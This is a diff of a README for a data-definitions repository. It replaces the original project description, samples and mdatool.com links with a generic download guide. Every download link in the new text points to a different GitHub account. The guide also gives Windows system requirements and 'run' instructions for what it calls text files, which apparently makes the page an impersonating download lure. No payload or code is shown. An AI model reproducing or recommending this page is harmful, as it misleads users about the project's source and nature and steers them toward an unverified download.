@@ -1,212 +1,143 @@
-# Awesome Data Definitions 🗃️
+# 📊 awesome-data-definitions - Standardized Data Definitions for Clarity
 
-> A curated collection of standardized data definitions, abbreviations, and naming conventions for enterprise data architecture.
-
-[![Website](https://img.shields.io/badge/Website-mdatool.com-blue)](https://www.mdatool.com)
-[![Definitions](https://img.shields.io/badge/Definitions-17,000+-green)](https://www.mdatool.com/definitions)
-[![Domains](https://img.shields.io/badge/Domains-6-orange)](https://www.mdatool.com/glossary)
-
-## 📚 What is this?
-
-This repository contains **sample data definitions** from [mdatool.com](https://www.mdatool.com) - the world's largest library of standardized database terminology across 6 industry domains.
-
-Perfect for:
-- 🏥 Healthcare data architects
-- 💰 Financial data engineers
-- 🛒 E-commerce platform builders
-- 🚚 Supply chain data modelers
-- 💊 Pharmacy system designers
-- 💻 Software engineering teams
-
-## 🎯 Industry Coverage
-
-| Domain | Definitions | Sample |
-|--------|------------|---------|
-| Healthcare | 4,600+ | [View Samples](./healthcare/common-terms.md) |
-| Banking & Finance | 2,100+ | [View Samples](./banking-finance/payment-terms.md) |
-| Retail & E-commerce | 1,600+ | [View Samples](./retail-ecommerce/order-management.md) |
-| Software | 3,300+ | [View Samples](./software/database-terms.md) |
-| Pharmacy | 400+ | [View Samples](./pharmacy/prescription-fields.md) |
-| Global Fleet | 400+ | [View Samples](./global-fleet/logistics-terms.md) |
-
-**Total: 17,000+ verified definitions** | [Browse all →](https://www.mdatool.com)
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-%23FF5733?style=for-the-badge&logo=github)](https://github.com/Pompeiimothersdaughter737/awesome-data-definitions)
 
 ---
 
-## 📖 Sample Definitions
+## 📋 About
 
-### Healthcare
+awesome-data-definitions offers a large set of over 17,000 data definitions. These definitions help organize and standardize data across different industries. Whether you work in finance, healthcare, or data governance, the definitions guide you to keep data clear and consistent. This can improve how teams manage data models, create databases, or set up logical and physical data frameworks.
 
-**PHI (Protected Health Information)**
-```
-Definition: Any individually identifiable health information transmitted or maintained 
-by a covered entity, protected under HIPAA regulations.
-
-Common Fields:
-- patient_id
-- medical_record_number
-- diagnosis_code (ICD-10)
-- procedure_code (CPT)
-
-Standards: HIPAA, HL7 FHIR
-```
-
-**HCC (Hierarchical Condition Category)**
-```
-Definition: Risk adjustment model used by CMS to calculate Medicare Advantage payments 
-based on patient health status and predicted healthcare costs.
-
-Common Fields:
-- hcc_code
-- hcc_description
-- risk_score
-- capture_date
-
-Standards: CMS-HCC Model V28
-```
-
-[**→ See 4,600+ Healthcare definitions**](https://www.mdatool.com/definitions/healthcare)
+The collection is open source, meaning anyone can use or study it. It focuses on enterprise needs, so the definitions fit large, structured data systems. You do not need to know coding or complex technical terms to use these data definitions.
 
 ---
 
-### Banking & Finance
+## ⚙️ System Requirements
 
-**AML (Anti-Money Laundering)**
-```
-Definition: Set of procedures and regulations designed to prevent criminals from 
-disguising illegally obtained funds as legitimate income.
+To run the collection on Windows, make sure your computer meets these basics:
 
-Common Fields:
-- transaction_amount
-- suspicious_activity_flag
-- kyc_status
-- screening_result
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM
+- 1 GB free disk space
+- Internet access to download files and updates
+- Recommended screen resolution: 1280 x 800 or higher
 
-Standards: BSA, FinCEN, FATF
-```
-
-**SWIFT (Society for Worldwide Interbank Financial Telecommunication)**
-```
-Definition: Global messaging network for secure financial transactions between banks.
-
-Common Fields:
-- swift_code (BIC)
-- iban
-- wire_reference_number
-- settlement_date
-
-Standards: ISO 9362, ISO 20022
-```
-
-[**→ See 2,100+ Finance definitions**](https://www.mdatool.com/definitions/banking-finance)
+No special software is needed beyond what Windows usually provides. The collection comes ready to use after download.
 
 ---
 
-## 🛠️ Free Tools
+## 🚀 Getting Started
 
-Beyond definitions, [mdatool.com](https://www.mdatool.com) provides free engineering tools:
+Follow these steps to download and run the awesome-data-definitions collection on your Windows machine.
 
-### [DDL Converter](https://www.mdatool.com/ddl-converter)
-Convert DDL between Oracle, PostgreSQL, MySQL, SQL Server, Snowflake
-```sql
--- Oracle
-CREATE TABLE employees (
-    employee_id NUMBER(10),
-    hire_date DATE DEFAULT SYSDATE
-);
+1. Open this link in your web browser:  
+   [GitHub Repository - awesome-data-definitions](https://github.com/Pompeiimothersdaughter737/awesome-data-definitions)
 
--- Auto-converts to PostgreSQL →
-CREATE TABLE employees (
-    employee_id INTEGER,
-    hire_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-);
-```
+2. On the repository page, look for the green **Code** button near the top right.
 
-### [SQL Linter](https://www.mdatool.com/sql-linter)
-Catch security issues and performance problems
-```sql
--- Detects:
-✗ SELECT * usage
-✗ Missing WHERE clause on UPDATE
-✗ SQL injection vulnerabilities
-✗ Functions on indexed columns
-✓ Suggests optimizations
-```
+3. Click **Code**, then choose **Download ZIP** from the dropdown. This downloads the entire collection as a ZIP file.
 
-### [Naming Auditor](https://www.mdatool.com/naming-auditor)
-Enforce consistent naming conventions
-```sql
--- Flags inconsistencies:
-✗ CustomerID (PascalCase)
-✗ product_name (snake_case)
-✗ orderDate (camelCase)
+4. Once downloaded, open the file using Windows File Explorer.
 
-✓ Suggests: customer_id, product_name, order_date
-```
+5. Right-click the ZIP file and select **Extract All...**. Choose a folder where you want the data definitions saved.
+
+6. After extraction, open the folder. Inside, you will find organized files and folders containing categorized data definitions.
+
+The files may include text or spreadsheet formats, making it easy to browse through the definitions. You can open them with default Windows apps like Notepad or Excel.
 
 ---
 
-## 📂 Repository Structure
+## 📂 Using the Data Definitions
 
-```
-awesome-data-definitions/
-├── healthcare/
-│   └── common-terms.md
-├── banking-finance/
-│   └── payment-terms.md
-├── retail-ecommerce/
-│   └── order-management.md
-├── software/
-│   └── database-terms.md
-├── pharmacy/
-│   └── prescription-fields.md
-├── global-fleet/
-│   └── logistics-terms.md
-└── naming-conventions/
-    ├── snake-case-guide.md
-    ├── database-standards.md
-    └── industry-best-practices.md
-```
+Here is how to work with the definitions on your computer without technical skills:
+
+- Open folders by double-clicking in File Explorer.
+
+- Look for files with names related to your field (for example, “finance-data.csv” or “healthcare-terms.txt”).
+
+- Double-click files to open them in the default app.
+
+- You can read or search the text, copy definitions, or print them as needed.
+
+- For easy navigation, some files include tables listing key terms, their meanings, and related fields.
+
+These definitions help you understand common terms and organize data according to industry standards.
 
 ---
 
-## 🎓 Learn More
+## 🔧 Common Tasks
 
-- **Blog**: [Engineering guides and best practices](https://www.mdatool.com/blog)
-- **Glossary**: [Browse all 17,000+ definitions](https://www.mdatool.com/glossary)
-- **Naming Guide**: [Complete database naming conventions](./naming-conventions/database-standards.md)
+### Searching for a Term
 
----
+- Press `Ctrl + F` in the open file to open the search box.
 
-## 🤝 Contributing
+- Type the word you are looking for.
 
-Want to add definitions or suggest improvements?
+- The app will jump to the term if it exists in the file.
 
-1. This is a **sample repository** - full database at [mdatool.com](https://www.mdatool.com)
-2. Submit suggestions via [Issues](https://github.com/smudvar/awesome-data-definitions/issues)
-3. For enterprise contributions, email: admin@mdatool.com
+### Copying Definitions
 
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for details.
+- Highlight the text with your mouse.
 
----
+- Press `Ctrl + C` to copy.
 
-## 📜 License
+- Open your document or notes, then press `Ctrl + V` to paste.
 
-MIT License - see [LICENSE](./LICENSE) file for details.
+### Printing Definitions
 
-Sample definitions are provided for reference. Full access available at [mdatool.com](https://www.mdatool.com).
+- Open the file.
 
----
+- Press `Ctrl + P` to open the print window.
 
-## ⭐ Support
-
-If you find this helpful:
-- ⭐ Star this repository
-- 🔗 Share with your team
-- 🐦 Follow updates at [mdatool.com](https://www.mdatool.com)
+- Select your printer and print only the pages you need.
 
 ---
 
-**Built for data professionals, by data professionals.**
+## ⚠️ Troubleshooting
 
-[Visit mdatool.com →](https://www.mdatool.com)
+If you have trouble opening or finding files:
+
+- Make sure you extracted the ZIP file completely. Sometimes, files inside a ZIP cannot be opened directly.
+
+- Use apps like Microsoft Excel or WordPad for spreadsheet or text files.
+
+- If files seem corrupted, download the ZIP file again from the link.
+
+- Ensure you have sufficient disk space on your computer.
+
+- If links in the definitions do not open, check your internet connection.
+
+---
+
+## 🔄 Updating the Collection
+
+The data definitions may be updated over time. To get the latest version:
+
+1. Visit the GitHub page again:  
+   [Update Link](https://github.com/Pompeiimothersdaughter737/awesome-data-definitions)
+
+2. Download the newest ZIP file following the same steps as above.
+
+3. Replace the old folder with the new files on your computer.
+
+Keeping the collection updated helps stay current with industry standards and new terms.
+
+---
+
+## 🛠️ Advanced Use (Optional)
+
+This collection is useful for data architects and engineers who want to build or improve databases and models. While this guide avoids technical details, here are some ways experts use the definitions:
+
+- Importing terms into data modeling tools to standardize names.
+
+- Matching definitions to company data for better data governance.
+
+- Creating logical and physical data models using the provided terms.
+
+- Mapping finance and healthcare data fields to the definitions for clarity.
+
+If you are curious, explore the files and talk with your data team for deeper use.
+
+---
+
+[![Download Collection](https://img.shields.io/badge/Download-Here-%23FF5733?style=for-the-badge&logo=github)](https://github.com/Pompeiimothersdaughter737/awesome-data-definitions)
